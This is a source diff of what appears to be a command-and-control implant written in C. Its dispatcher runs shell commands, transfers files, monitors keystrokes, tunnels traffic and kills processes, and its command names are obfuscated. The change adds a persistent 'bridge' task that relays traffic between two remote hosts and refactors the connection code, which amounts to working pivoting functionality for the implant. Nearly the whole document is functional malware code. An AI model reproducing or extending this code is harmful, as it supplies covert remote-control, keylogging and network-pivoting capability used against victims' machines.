@@ -35,6 +35,8 @@
 // Max length for URL hostname, and path. Used for parsing.
 #define MAX_URL_HOST_LEN 256
 #define MAX_URL_PATH_LEN 512
+// Reconnection delay for TCP bridge (in secs)
+#define TCP_BRIDGE_RECONNECT_DELAY 5
 
 #ifdef IS_WINDOWS
   // Max file upload size
@@ -810,11 +812,69 @@ void keymon(session *striker, task *tsk){
   }
 #endif
 
+#ifdef IS_LINUX
+  int tcp_connect(char *host, int port){
+
+    int conn_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (conn_fd == -1)
+      return -1;
+    char *port_str = malloc(6);
+    snprintf(port_str, 6, "%d", port);
+    struct addrinfo *server_addr;
+    if (getaddrinfo(host, port_str, NULL, &server_addr)){
+      free(port_str);
+      return -1;
+    }
+    int connected = 0;
+    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next){
+      if (connect(conn_fd, addr_ptr->ai_addr, addr_ptr->ai_addrlen))
+        continue;
+      connected = 1;
+      break;
+    }
+    freeaddrinfo(server_addr);
+    free(port_str);
+    return (connected ? conn_fd : -1);
+  }
+#else
+  SOCKET tcp_connect(char *host, int port){
+
+    char *port_str = malloc(6);
+    snprintf(port_str, 6, "%d", port);
+    SOCKET conn = INVALID_SOCKET;
+    struct addrinfo *server_addr = NULL, hints;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    int iResult = getaddrinfo(host, port_str, &hints, &server_addr);
+    if (iResult != 0){
+      free(port_str);
+      return INVALID_SOCKET;
+    }
+    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next) {
+      conn = socket(addr_ptr->ai_family, addr_ptr->ai_socktype, 
+        addr_ptr->ai_protocol);
+      if (conn == INVALID_SOCKET)
+        break;
+      iResult = connect(conn, addr_ptr->ai_addr, (int)addr_ptr->ai_addrlen);
+      if (iResult == SOCKET_ERROR) {
+        closesocket(conn);
+        conn = INVALID_SOCKET;
+        continue;
+      }
+    }
+    freeaddrinfo(server_addr);
+    free(port_str);
+    return conn;
+  }
+#endif
+
+
 int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost, int rport){
 
-  char *lport_str = malloc(6), *rport_str = malloc(6);
+  char *lport_str = malloc(6);
   snprintf(lport_str, 6, "%d", lport);
-  snprintf(rport_str, 6, "%d", rport);
   #ifdef IS_LINUX
     // Setup the socket server.
     int sock_fd, conn_fd;
@@ -861,7 +921,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       queue_put(args, striker);
       queue_put(args, tsk);
       queue_put(args, rhost);
-      queue_put(args, rport_str);
+      queue_put(args, &rport);
       queue_put(args, &conn_fd);
       if (pthread_create(&tid, NULL, tcp_tunnel_route, (void *)args)){
         queue_free(args, 0);
@@ -886,14 +946,14 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     hints.ai_flags = AI_PASSIVE;
     iResult = getaddrinfo(lhost, lport_str, &hints, &socket_addr);
     if ( iResult != 0 ) {
-      free(lport_str); free(rport_str);
+      free(lport_str);
       WSACleanup();
       return 1;
     }
     listen_sock = socket(socket_addr->ai_family, socket_addr->ai_socktype, socket_addr->ai_protocol);
     if (listen_sock == INVALID_SOCKET){
       freeaddrinfo(socket_addr);
-      free(lport_str); free(rport_str);
+      free(lport_str);
       WSACleanup();
       return 1;
     }
@@ -904,7 +964,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     if (iResult == SOCKET_ERROR) {
       freeaddrinfo(socket_addr);
       closesocket(listen_sock);
-      free(lport_str); free(rport_str);
+      free(lport_str);
       WSACleanup();
       return 1;
     }
@@ -912,7 +972,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     iResult = listen(listen_sock, SOMAXCONN);
     if (iResult == SOCKET_ERROR) {
       closesocket(listen_sock);
-      free(lport_str); free(rport_str);
+      free(lport_str);
       WSACleanup();
       return 1;
     }
@@ -929,42 +989,19 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       if (*client_sock == INVALID_SOCKET) {
         if (WSAGetLastError() != WSAEWOULDBLOCK)
           break;
-        else
-          goto tunnel_data;
+        goto tunnel_data;
       }
       if (queue_full(conns)){ // No space. Kill the socket till an active connection is closed.
         closesocket(*client_sock);
         goto tunnel_data;
       }
       // Connect to the remote host.
-      *server_sock = INVALID_SOCKET;
-      ZeroMemory(&hints, sizeof(hints));
-      hints.ai_family = AF_UNSPEC;
-      hints.ai_socktype = SOCK_STREAM;
-      hints.ai_protocol = IPPROTO_TCP;
-      iResult = getaddrinfo(rhost, rport_str, &hints, &socket_addr);
-      if (iResult != 0){
-        closesocket(*client_sock);
-        goto tunnel_data;
-      }
-      for (struct addrinfo *addr_ptr = socket_addr; addr_ptr != NULL ;addr_ptr=addr_ptr->ai_next) {
-        *server_sock = socket(addr_ptr->ai_family, addr_ptr->ai_socktype, 
-          addr_ptr->ai_protocol);
-        if (*server_sock == INVALID_SOCKET)
-          break;
-        iResult = connect(*server_sock, addr_ptr->ai_addr, (int)addr_ptr->ai_addrlen);
-        if (iResult == SOCKET_ERROR) {
-          closesocket(*server_sock);
-          *server_sock = INVALID_SOCKET;
-          continue;
-        }
-      }
-      freeaddrinfo(socket_addr);
+      *server_sock = tcp_connect(rhost, rport);
       if (*server_sock == INVALID_SOCKET){ // Connection failed.
         closesocket(*client_sock);
       }else{ // Successful connection. Update the connections queue.
         queue *sock_data = queue_init(2);
-        iMode = 1;
+        u_long iMode = 1;
         ioctlsocket(*client_sock, FIONBIO, &iMode);
         ioctlsocket(*server_sock, FIONBIO, &iMode);
         queue_put(sock_data, client_sock);
@@ -1024,7 +1061,7 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     free(buffer);
     WSACleanup();
   #endif
-  free(lport_str); free(rport_str);
+  free(lport_str);
   return 0;
 }
 
@@ -1036,26 +1073,12 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     session *striker = queue_get(args);
     task *tsk = queue_get(args);
     char *rhost = queue_get(args);
-    char *rport = queue_get(args);
+    int rport = *((int *)queue_get(args));
     int client_fd = *((int *)queue_get(args));
     queue_free(args, 0);
-    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
+    int server_fd = tcp_connect(rhost, rport);
     if (server_fd == -1)
       pthread_exit(NULL);
-    struct addrinfo *server_addr;
-    if (getaddrinfo(rhost, rport, NULL, &server_addr))
-      pthread_exit(NULL);
-    int block_size = 1024 * 50;
-    char *buffer = malloc(block_size);
-    int connected = 0;
-    for (struct addrinfo *addr_ptr = server_addr; addr_ptr != NULL; addr_ptr = addr_ptr->ai_next){
-      if (connect(server_fd, addr_ptr->ai_addr, addr_ptr->ai_addrlen))
-        continue;
-      connected = 1;
-      break;
-    }
-    if (!connected)
-      goto end;
     fd_set client_set, server_set;
     struct timeval timeout;
     int n = 0, status;
@@ -1088,13 +1111,111 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
       }
     }
     end:
-      freeaddrinfo(server_addr);
       close(server_fd);
       close(client_fd);
       free(buffer);
       pthread_exit(NULL);
   }
 #endif
+
+void tcp_bridge(session *striker, task *tsk, char *host1, int port1, char *host2, int port2){
+
+  #ifdef IS_LINUX
+    while (!(striker->abort || tsk->abort)){
+      int conn1_fd = tcp_connect(host1, port1);
+      if (conn1_fd == -1){
+        sleep(TCP_BRIDGE_RECONNECT_DELAY);
+        continue;
+      }
+      int conn2_fd = tcp_connect(host2, port2);
+      if (conn2_fd == -1){
+        close(conn1_fd);
+        sleep(TCP_BRIDGE_RECONNECT_DELAY);
+        continue;
+      }
+      int block_size = 1024 * 50;
+      char *buffer = malloc(block_size);
+      fd_set conn1_set, conn2_set;
+      struct timeval timeout;
+      int n = 0, status;
+      while (!(striker->abort || tsk->abort)){
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 5000;
+        FD_ZERO(&conn1_set);
+        FD_SET(conn1_fd, &conn1_set);
+        status = select(conn1_fd + 1, &conn1_set, NULL, NULL, &timeout);
+        if (status == -1)
+          break;
+        if (status){
+          n = read(conn1_fd, buffer, block_size);
+          if (n == -1 || n == 0)
+            break;
+          write(conn2_fd, buffer, n);
+        }
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 5000;
+        FD_ZERO(&conn2_set);
+        FD_SET(conn2_fd, &conn2_set);
+        status = select(conn2_fd + 1, &conn2_set, NULL, NULL, &timeout);
+        if (status == -1)
+          break;
+        if (status){
+          n = read(conn2_fd, buffer, block_size);
+          if (n == -1 || n == 0)
+            break;
+          write(conn1_fd, buffer, n);
+        }
+      }
+      close(conn1_fd);
+      close(conn2_fd);
+      free(buffer);
+    }
+  #else
+    while (!(striker->abort || tsk->abort)){
+      SOCKET sock1 = tcp_connect(host1, port1);
+      if (sock1 == INVALID_SOCKET){
+        sleep(TCP_BRIDGE_RECONNECT_DELAY);
+        continue;
+      }
+      SOCKET sock2 = tcp_connect(host2, port2);
+      if (sock2 == INVALID_SOCKET){
+        closesocket(sock1);
+        sleep(TCP_BRIDGE_RECONNECT_DELAY);
+        continue;
+      }
+      u_long iMode = 1;
+      ioctlsocket(sock1, FIONBIO, &iMode);
+      ioctlsocket(sock2, FIONBIO, &iMode);
+      int block_size = 1024 * 50;
+      char *buffer = malloc(block_size);
+      int iResult;
+      while (!(striker->abort || tsk->abort)){
+        iResult = recv(sock1, buffer, block_size, 0);
+        if (iResult == SOCKET_ERROR){
+          if (WSAGetLastError() != WSAEWOULDBLOCK)
+            break;
+        }else{
+          if (iResult == 0)
+            break;
+          send(sock2, buffer, iResult, 0);
+        }
+        iResult = recv(sock2, buffer, block_size, 0);
+        if (iResult == SOCKET_ERROR){
+          if (WSAGetLastError() != WSAEWOULDBLOCK)
+            break;
+        }else{
+          if (iResult == 0)
+            break;
+          send(sock1, buffer, iResult, 0);
+        }
+        Sleep(5); // A 5 ms cooldown.
+      }
+      free(buffer);
+      closesocket(sock1);
+      closesocket(sock2);
+    }
+  #endif
+}
 
 task *parse_task(cJSON *json){
 
@@ -1137,8 +1258,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel"};
-  for (int i = 0; i < 10; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge"};
+  for (int i = 0; i < 11; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1269,12 +1390,21 @@ DWORD WINAPI task_executor(LPVOID ptr)
       buffer_strcpy(result_buff, obfs_decode(strs[5]));
       tsk->successful = 1;
     }
+  }else if (!strcmp(tsk->type, cmd_strs[10])){ // Create a TCP bridge
+    char strs[][30] = {"[OBFS_ENC]host1", "[OBFS_ENC]port1", "[OBFS_ENC]host2", "[OBFS_ENC]port2", "[OBFS_ENC]Bridge closed!"};
+    char *host1 = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
+    int port1 = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
+    char *host2 = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])));
+    int port2 = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[3])));
+    tcp_bridge(striker, tsk, host1, port1, host2, port2);
+    buffer_strcpy(result_buff, obfs_decode(strs[4]));
+    tsk->successful = 1;
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
   }
 
-  complete: ; // empty statement to appease GCC
+  complete: ; // GCC hates definitions directly after a block tag.
     char strs[][20] = {"[OBFS_ENC]uid", "[OBFS_ENC]result", "[OBFS_ENC]successful"};
     for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
